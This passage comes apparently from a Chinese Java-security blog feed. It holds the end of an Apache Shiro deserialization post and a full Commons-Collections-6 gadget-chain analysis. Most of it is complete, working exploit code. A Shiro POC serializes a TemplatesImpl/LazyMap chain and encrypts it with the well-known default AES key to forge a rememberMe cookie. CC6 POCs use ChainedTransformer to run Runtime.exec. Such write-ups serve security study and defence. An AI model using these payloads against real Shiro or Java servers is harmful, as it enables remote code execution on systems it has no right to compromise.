class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">package com.javasec.shiro;<br><br>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br>import javassist.ClassPool;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br><br>import static com.javasec.util.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Reset</span>.</span></span>setFieldValue;<br><br>public <span class="hljs-keyword">class</span> Payload2 &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Test</span>.</span><span class="hljs-module"><span class="hljs-identifier">Evil</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>)</span>;<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br><br>        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-params">null</span>,<span class="hljs-params">null</span>)</span>;<br>        invokerTransformer.transform(templates);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/markdown-img-paste-20211201154023502.png"></p><p>成功执行命令，证明猜想可行</p><h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><p>修改cc6的后半段，poc如下</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">package com.javasec.shiro;<br><br>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br>import javassist.ClassPool;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.keyvalue.TiedMapEntry;<br>import org.apache.commons.collections.map.LazyMap;<br>import org.apache.shiro.codec.Base64;<br>import org.apache.shiro.codec.CodecSupport;<br>import org.apache.shiro.crypto.AesCipherService;<br>import org.apache.shiro.util.ByteSource;<br><br>import java.io.ByteArrayOutputStream;<br>import java.io.ObjectOutputStream;<br>import java.util.HashMap;<br>import java.util.Map;<br><br>import static com.javasec.util.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Reset</span>.</span></span>setFieldValue;<br><br>public <span class="hljs-keyword">class</span> Payload2 &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Test</span>.</span><span class="hljs-module"><span class="hljs-identifier">Evil</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>)</span>;<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br><br>        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">InvokerTransformer(<span class="hljs-string">&quot;getClass&quot;</span>,<span class="hljs-params">null</span>,<span class="hljs-params">null</span>)</span>;<br><br>        Map inmap = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HashMap()</span>;<br>        Map outmap = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>decorate(inmap,invokerTransformer);<br><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TiedMapEntry(<span class="hljs-params">outmap</span>,<span class="hljs-params">templates</span>)</span>;<br><br>        Map expmap = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HashMap()</span>;<br>        expmap.put(tiedMapEntry,<span class="hljs-string">&quot;value&quot;</span>);<br><br>        outmap.clear<span class="hljs-literal">()</span>;<br><br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">invokerTransformer</span>,<span class="hljs-string">&quot;iMethodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>)</span>;<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;<br>        ObjectOutputStream out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">byteArrayOutputStream</span>)</span>;<br>        out.write<span class="hljs-constructor">Object(<span class="hljs-params">expmap</span>)</span>;<br>        out.close<span class="hljs-literal">()</span>;<br><br>        byte<span class="hljs-literal">[]</span> <span class="hljs-built_in">bytes</span> = byteArrayOutputStream.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>;<br><br>        AesCipherService aesCipherService = <span class="hljs-keyword">new</span> <span class="hljs-constructor">AesCipherService()</span>;<br>        byte<span class="hljs-literal">[]</span> key = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>decode(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CodecSupport</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span>);<br>        aesCipherService.encrypt(<span class="hljs-built_in">bytes</span>,key);<br>        ByteSource ciphertext = aesCipherService.encrypt(<span class="hljs-built_in">bytes</span>, key);<br>        java.util.Base64.Encoder base = java.util.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(base.encode<span class="hljs-constructor">ToString(<span class="hljs-params">ciphertext</span>.<span class="hljs-params">getBytes</span>()</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行命令</p><p><img src="/img/markdown-img-paste-20211201165236686.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文分析了shiro的加解密流程，并且根据漏洞点给出了有依赖和无依赖两种POC构造</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shrio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Common-Collections-6 反序列化利用分析</title>
    <link href="/2021/11/15/CommonsCollections-6%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <url>/2021/11/15/CommonsCollections-6%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CommonCollections1利用链有局限性，在高版本的利用下不能成功利用，因此我们需要找到新的利用链，而Common-Collections-6正是CommonCollections1的高版本补充</p><p>本文将对Common-Collections-6的反序列化利用进行分析</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文将从以下方面进行讲述</p><ul><li>CommonCollections-6 POC分析</li><li>CommonCollections-6 POC构造</li></ul><h1 id="CommonCollections-6-POC分析"><a href="#CommonCollections-6-POC分析" class="headerlink" title="CommonCollections-6 POC分析"></a>CommonCollections-6 POC分析</h1><p>cc6的后半段跟cc1一样，都是用了ChainedTransformer</p><p>在cc1中，我们谈到了，在java8u71之后，由于AnnotationInvocationHandler#readObject中map处理发生改变，不会对反序列化的数组进行数据操作，因此导致cc1无法在高版本进行利用</p><p>根据代码我们可以得知，修复的原因本质上是由于LazyMap#get()不再会被调用了，因此我们需要找到一个调用的地方</p><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>在TiedMapEntry#getValue()中存在一个map.get()调用</p><p><img src="/images/markdown-img-paste-20211201141920416.png"></p><p>分析构造函数</p><p><img src="/images/markdown-img-paste-20211201142009601.png"></p><p>如果在构造的时候控制其值为LazyMap，就可以触发LazyMap#get()利用链</p><p>在TiedMapEntry中，getValue的调用点在hashCode()中</p><p><img src="/images/markdown-img-paste-20211201142154928.png"></p><p>因此需要找一个TiedMapEntry#hashCode调用点</p><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>在java.util.HashMap#hash中，存在一个hashCode调用</p><p><img src="/images/markdown-img-paste-20211201142326162.png"></p><p>我们可以控制key的值为TideMapEntry，就可以调用TideMapEntry#hashCode方法</p><p>查找用法，发现在readObject中存在一次调用</p><p><img src="/images/markdown-img-paste-20211201142518357.png"></p><p>跟踪readObject函数</p><p><img src="/images/markdown-img-paste-20211201142604324.png"></p><p>发现key的值来源于s.readObject()</p><p><code>K key = (K) s.readObject();</code></p><p>而s的值来源于序列化流</p><p><img src="/images/markdown-img-paste-20211201142726884.png"></p><p>因此我们可以构造从readObject到LazyMap#get再到invokeTransform的一条利用链</p><h1 id="CommonCollections-6-POC-构造"><a href="#CommonCollections-6-POC-构造" class="headerlink" title="CommonCollections-6 POC 构造"></a>CommonCollections-6 POC 构造</h1><p>根据分析步骤一步一步来</p><p>首先先搬运cc1的后半段</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs haxe">Transformer Testtransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123;<br>                        <span class="hljs-keyword">String</span>.class,<br>                        Class[].<span class="hljs-class"><span class="hljs-keyword">class</span> &#125;, <span class="hljs-title">new</span> <span class="hljs-title">Object</span>[] </span>&#123; <span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123;<br>                        Object.class,<br>                        Object[].<span class="hljs-class"><span class="hljs-keyword">class</span> &#125;, <span class="hljs-title">new</span> <span class="hljs-title">Object</span>[] </span>&#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span><span class="hljs-type"></span><br>                        Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123; <span class="hljs-keyword">String</span>.class<br>                &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        Map innerMap = <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>();<br>        Map outerMap = LazyMap.decorate(innerMap, Testtransformer);<br></code></pre></td></tr></table></figure><p>然后构造恶意TideMapEntry</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">TiedMapEntry tme = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TiedMapEntry(<span class="hljs-params">outerMap</span>, <span class="hljs-string">&quot;keykey&quot;</span>)</span>;<br></code></pre></td></tr></table></figure><p>构造恶意HashMap</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Map expMap = <span class="hljs-keyword">new</span> <span class="hljs-built_in">HashMap</span>();<br>expMap.<span class="hljs-built_in">put</span>(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br></code></pre></td></tr></table></figure><p>修改ChainedTransformer中iTransformers的值</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Field f = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>)</span>;<br>f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>f.set(Testtransformer, transformers);<br></code></pre></td></tr></table></figure><p>最终POC如下</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> com.javasec.cc6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Payload</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] argv) throws Exception&#123;<br><br>        Transformer Testtransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123;<br>                        <span class="hljs-keyword">String</span>.class,<br>                        Class[].<span class="hljs-class"><span class="hljs-keyword">class</span> &#125;, <span class="hljs-title">new</span> <span class="hljs-title">Object</span>[] </span>&#123; <span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123;<br>                        Object.class,<br>                        Object[].<span class="hljs-class"><span class="hljs-keyword">class</span> &#125;, <span class="hljs-title">new</span> <span class="hljs-title">Object</span>[] </span>&#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span><span class="hljs-type"></span><br>                        Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123; <span class="hljs-keyword">String</span>.class<br>                &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        Map innerMap = <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>();<br>        Map outerMap = LazyMap.decorate(innerMap, Testtransformer);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> <span class="hljs-type">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.<span class="hljs-keyword">set</span>(Testtransformer, transformers);<br><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-type">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">ByteArrayInputStream</span>(barr.toByteArray()));<br>        Object o = (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是我们运行的时候，并未成功执行</p><p>经过试调，我们发现一个问题</p><p><img src="/images/markdown-img-paste-20211201144716619.png"></p><p>在反序列化的时候，map.containsKey(key) == True，无法进入map.put操作</p><p>向上追溯代码，我们可以发现，在HashMap#put操作中，存在一次利用链的调用</p><p><img src="/images/markdown-img-paste-20211201144951340.png"></p><p>由于此时我们尚未修改iTransformers，因此没有触发命令执行，但是依旧修改了LazyMap的值，所以我们需要删除key</p><p><code>outerMap.remove(&quot;keykey&quot;);</code></p><p>最终POC如下</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> com.javasec.cc6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Payload</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] argv) throws Exception&#123;<br><br>        Transformer Testtransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123;<br>                        <span class="hljs-keyword">String</span>.class,<br>                        Class[].<span class="hljs-class"><span class="hljs-keyword">class</span> &#125;, <span class="hljs-title">new</span> <span class="hljs-title">Object</span>[] </span>&#123; <span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123;<br>                        Object.class,<br>                        Object[].<span class="hljs-class"><span class="hljs-keyword">class</span> &#125;, <span class="hljs-title">new</span> <span class="hljs-title">Object</span>[] </span>&#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span><span class="hljs-type"></span><br>                        Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123; <span class="hljs-keyword">String</span>.class<br>                &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        Map innerMap = <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>();<br>        Map outerMap = LazyMap.decorate(innerMap, Testtransformer);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> <span class="hljs-type">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);<br>        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.<span class="hljs-keyword">set</span>(Testtransformer, transformers);<br><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-type">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">ByteArrayInputStream</span>(barr.toByteArray()));<br>        Object o = (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行命令</p><p><img src="/images/markdown-img-paste-20211201141304229.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文主要分析了cc3.2.1高版本的POC利用，并给出了完整POC</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Common-Collections</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Common-Collections-1 反序列化利用分析</title>
    <link href="/2021/11/11/CommonsCollections-1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <url>/2021/11/11/CommonsCollections-1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
    
